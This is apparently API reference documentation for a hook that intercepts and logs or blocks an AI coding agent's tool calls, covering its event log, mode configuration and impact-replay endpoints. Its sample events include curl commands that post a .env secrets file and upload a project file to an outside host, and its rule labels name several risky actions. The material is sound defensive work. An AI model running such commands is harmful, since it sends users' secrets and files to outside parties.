## Overview

The Enforcement API manages the `claudesec-enforce.cjs` PreToolUse hook. The hook intercepts
Claude Code tool calls before they run, evaluates them against the detection rules, and either
monitors silently or blocks — depending on the configured mode. These endpoints let you read the
live event feed, query or update the active mode, and set per-rule action overrides.

Enforcement log events are **persisted to a capped SQLite table** (pruned to the most recent 500)
and carry a **hash chain** — each row links to the one before it, so the feed
survives a restart and any later edit to an earlier row is detectable. A `Socket.io` `enforce-log`
event is still broadcast to the dashboard on each new event, and an `enforce-config` event is
broadcast whenever the config is changed. Use [`GET /api/audit/verify`](/api-reference/audit-log#get-apiauditverify)
to confirm the chain is intact.

## Endpoints

### POST /api/enforce-log

Ingest an enforcement event from the PreToolUse hook. The hook calls this endpoint each time it
evaluates a tool call. You do not normally call this directly; it is part of the hook's internal
protocol.

**Request body:**

```json
{
  "mode": "monitor",
  "label": "Bash — exfil attempt",
  "severity": "high",
  "command": "curl https://example.com -d @/home/dev/project/.env",
  "wouldBlock": true,
  "blocked": false
}
```

| Field | Type | Description |
|---|---|---|
| `mode` | string | `"monitor"` or `"enforce"` — the mode the hook was running |
| `label` | string | Matched rule label (scrubbed before storage; max 256 chars) |
| `severity` | string | Rule severity: `low`, `medium`, or `high` |
| `command` | string | The tool input that triggered the rule (scrubbed; max 1 000 chars) |
| `wouldBlock` | boolean | `true` if the rule would have blocked in enforce mode |
| `blocked` | boolean | `true` if the tool call was actually denied (catastrophic floor or enforce mode) |

All string fields are run through the same secret scrubber as the ingestion pipeline before
being stored or broadcast — home paths and API keys are redacted at write time and again on
read.

**Response:** `{ "status": "ok" }`

### GET /api/enforce-log

Return recent enforcement events from the persisted feed, most-recent first.

```bash
curl "http://localhost:3000/api/enforce-log?limit=50"
```

### Query parameters

| Parameter | Type | Default | Description |
|---|---|---|---|
| `limit` | integer | `100` | Number of events to return; capped at the retained-event max (500) |

**Response:**

```json
{
  "events": [
    {
      "ts": 1749600000000,
      "mode": "monitor",
      "label": "Bash — curl to external host",
      "severity": "high",
      "command": "curl https://example.com/upload -F file=@/home/dev/project/notes.txt",
      "wouldBlock": true,
      "blocked": false
    },
    {
      "ts": 1749599940000,
      "mode": "enforce",
      "label": "Bash — git push to unknown remote",
      "severity": "medium",
      "command": "git push origin main",
      "wouldBlock": true,
      "blocked": true
    }
  ],
  "total": 12
}
```

`total` is the total number of events in the persisted feed (may be larger than the requested
`limit`). `blocked: true` means the tool call was actually denied; `blocked: false` with
`wouldBlock: true` means the rule matched in monitor mode but the tool was allowed to run.

### GET /api/enforce/config

Return the current enforcement configuration and hook status.

```bash
curl http://localhost:3000/api/enforce/config
```

**Response:**

```json
{
  "mode": "monitor",
  "overrides": {
    "Bash — write to /etc/": "block"
  },
  "configFile": "/home/dev/.claudesec/enforce-config.json",
  "envMode": null,
  "bypassEnabled": false,
  "effectiveMode": "monitor",
  "modeSource": "config-file",
  "hookStatus": {
    "installed": "yes",
    "scopes": ["user"]
  }
}
```

| Field | Description |
|---|---|
| `mode` | The mode saved in the dashboard's database (`"monitor"` or `"enforce"`) |
| `overrides` | Map of rule label → action (`"alert"` or `"block"`) |
| `configFile` | Path to the mirrored `enforce-config.json` that the hook reads |
| `envMode` | Value of `CLAUDESEC_MODE` env var, or `null` if unset |
| `bypassEnabled` | `true` if `CLAUDESEC_HOOKS_BYPASS=1` is set |
| `effectiveMode` | The mode the hook will **actually** use, after applying file → env → default precedence |
| `modeSource` | Which layer supplied `effectiveMode`: `"config-file"`, `"env"`, or `"default"` |
| `hookStatus.installed` | `"yes"`, `"no"`, or `"unknown"` (unknown inside Docker where host settings aren't mounted) |
| `hookStatus.scopes` | Settings scopes where the hook was found, e.g. `["user", "project-local"]` |

`mode` and `effectiveMode` can differ: if `CLAUDESEC_MODE=enforce` is set but the config file
says `"monitor"`, `effectiveMode` will be `"monitor"` because the file takes precedence.

### PUT /api/enforce/config

Update the enforcement mode and/or per-rule action overrides. Changes are written to the config
file the hook reads and broadcast to the dashboard via Socket.io `enforce-config`.

```bash
curl -X PUT http://localhost:3000/api/enforce/config \
  -H "Content-Type: application/json" \
  -d '{ "mode": "enforce", "overrides": { "Bash — write to /etc/": "block" } }'
```

**Request body:**

```json
{
  "mode": "enforce",
  "overrides": {
    "Bash — write to /etc/": "block",
    "Bash — curl to external host": "alert"
  }
}
```

Both fields are optional — send only what you want to change.

| Field | Type | Description |
|---|---|---|
| `mode` | string | `"monitor"` or `"enforce"` |
| `overrides` | object | Flat map of rule label (string) → `"alert"` or `"block"` |

**Response:** The updated config (same shape as `GET /api/enforce/config`, omitting status fields):

```json
{
  "mode": "enforce",
  "overrides": {
    "Bash — write to /etc/": "block",
    "Bash — curl to external host": "alert"
  }
}
```

**Errors:**
- `400` — `mode` is not `"monitor"` or `"enforce"`, `overrides` is not a plain object, or any override value is not `"alert"` or `"block"`

### GET /api/enforce/impact

Answers *"what would enforce mode actually have blocked?"* by replaying your own recorded history
against the current rule set. Read-only: it evaluates stored spans and writes nothing.

Turning on enforcement is a decision about **your** work, not about a rule count. This endpoint
makes that decision measurable before you flip the toggle.

#### Query parameters

| Parameter | Default | Purpose |
|---|---|---|
| `days` | `30` | Size of the history window, clamped to `400` |

#### Response

Two separately-reported groups, because they mean different things:

- **`enforceOnly`** — calls that would be denied *if you switched to enforce*. This is the cost of
  the change.
- **`blocksToday`** — calls the always-on floors deny **already**, in `monitor` mode, with no
  per-action escape. This is happening now, and is usually the more urgent number.

Each group ranks the **rules**, not just the total, because the total is rarely actionable and the
distribution almost always is — a handful of rules typically account for most of the friction:

| Field | Meaning |
|---|---|
| `count` / `distinctCalls` | Matching calls, and how many were distinct commands |
| `share` / `cumulativeShare` | This rule's portion of the group, and the running total |
| `examples` | Up to 3 real commands that matched, so you can judge true vs false positive |
| `rulesToReach80` | How few rules account for 80% of the denials |
| `top10Share` | Portion covered by the ten most frequent rules |

Also returned: per-tool tallies (`Bash`, `Read`, `Edit`, `Write`, `WebFetch`), the evidence window,
elapsed query time, and explicit caveats about what the replay can and cannot know.

<Note>
  The replay calls the same evaluation path the hook and the MCP proxy use, rather than
  re-implementing pattern matching — a preview that matched differently from the enforcer would be
  worse than no preview. Spans are scrubbed at ingest, so the home-directory placeholder is mapped
  back **for matching only**; every label and example is re-scrubbed before it leaves the server.
</Note>

Results are memoized for 60 seconds. A full 400-day replay over a ~700 MB database takes a few
seconds and is paged rather than streamed, so span ingestion is never blocked while it runs.
